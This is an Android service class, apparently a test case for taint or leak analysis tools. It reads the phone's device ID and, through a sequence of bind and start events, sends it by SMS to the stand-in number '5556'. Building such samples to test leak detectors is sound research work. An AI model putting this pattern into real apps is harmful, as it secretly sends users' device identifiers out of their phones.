package edu.uta;

import java.util.Random;

import android.app.Service;
import android.content.Intent;
import android.os.Binder;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class ServiceEventSequence1 extends Service {

    private final IBinder mBinder = new LocalBinder();
    private final Random mGenerator = new Random();
    private String d1= "";
    private String d2 = "tmp";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
		TelephonyManager tMgr = (TelephonyManager) getApplicationContext().getSystemService(TELEPHONY_SERVICE);
		this.d1 = tMgr.getDeviceId();
		SmsManager.getDefault().sendTextMessage("5556", null, d2, null, null);
		
        return Service.START_NOT_STICKY;
    }

    public class LocalBinder extends Binder {
        ServiceEventSequence1 getService() {
            return ServiceEventSequence1.this;
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        this.d2 = this.d1;
        return mBinder;
    }

}
